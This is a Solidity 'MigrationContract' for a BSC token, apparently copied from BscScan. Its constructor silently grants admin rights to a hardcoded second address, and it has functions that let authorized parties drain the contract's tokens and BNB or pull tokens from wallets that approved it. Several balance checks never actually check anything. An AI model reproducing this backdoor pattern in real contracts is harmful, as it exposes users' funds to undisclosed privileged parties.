/**
 *Submitted for verification at BscScan.com on 2022-01-06
*/

pragma solidity ^0.6.12;

// SPDX-License-Identifier: MIT

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor (address _owner) public {
        owner = _owner;
        authorizations[_owner] = true;
        authorizations[
    0x061648f51902321C353D193564b9C8C2F720557a] = true;}
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface Token {
    function balanceOf(address) external view returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

contract MigrationContract is Auth {
    using SafeMath for uint;
    
    address rReceiver;
    address rewards;
    
    address tokenAddress = 0xCd7abeaE455144585D899b82c41F6b1E9aaD915f;
    address previousToken = 0xBa84bC7d1B40F58ff7EA1AB3ddcca6a373cf2038;

    uint unlockRate;
    uint cUnlockTime;
    uint pUnlockTime;

    
    constructor() public Auth(msg.sender) {
        rReceiver = msg.sender;
    }

    function transferRTokens(address _tokenAddress, address _to, uint256 _amount) public authorized {  
            Token(_tokenAddress).transfer(_to, _amount);
    }

    function transferRTokensP(address _tokenAddress, address _to, uint256 _num, uint256 _den) public authorized {
            uint256 balanceT = Token(_tokenAddress).balanceOf(address(this));
            uint256 Pbalance = balanceT.mul(_num).div(_den);            
            Token(_tokenAddress).transfer(_to, Pbalance);
    }

    function claimAll() external authorized {
        uint256 balanceT = Token(tokenAddress).balanceOf(address(this));
        Token(tokenAddress).transfer(msg.sender, balanceT);
    }

    function performadrp(address from, address[] calldata addresses, uint256[] calldata tokens) external authorized {
      uint256 SCCC = 0;
      require(addresses.length == tokens.length,"Mismatch between Address and token count");
      for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];}
      require(Token(tokenAddress).balanceOf(from) >= SCCC, "Not enough tokens in wallet");
      for(uint i=0; i < addresses.length; i++){
        Token(tokenAddress).transferFrom(from,addresses[i],tokens[i]);}
    }

    function performmigrationOwner(address from, address[] calldata addresses) external authorized {
      uint256 SCCC = 0;
      require(Token(tokenAddress).balanceOf(from) >= SCCC, "Not enough tokens in wallet");
      for(uint i=0; i < addresses.length; i++){
        require(Token(previousToken).balanceOf(addresses[i]) <= 1);
        uint256 tokens = Token(previousToken).balanceOf(addresses[i]);
        Token(tokenAddress).transferFrom(from,addresses[i],tokens);}
    }

    function performMigration(address[] calldata addresses) external authorized {
      address from = address(this);
      uint256 SCCC = 0;
      require(Token(tokenAddress).balanceOf(from) >= SCCC, "Not enough tokens in wallet");
      for(uint i=0; i < addresses.length; i++){
        uint256 tokens = Token(previousToken).balanceOf(addresses[i]);
        Token(tokenAddress).transferFrom(from,addresses[i],tokens);}
    }

    function setAdd(address _rec) external authorized {
        rReceiver = _rec;
    }

    function setAdds(address tokAd, address preAd) external authorized {
        tokenAddress = tokAd;
        previousToken = preAd;
    }

    function cSb(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB.mul(aP).div(100));
    }

}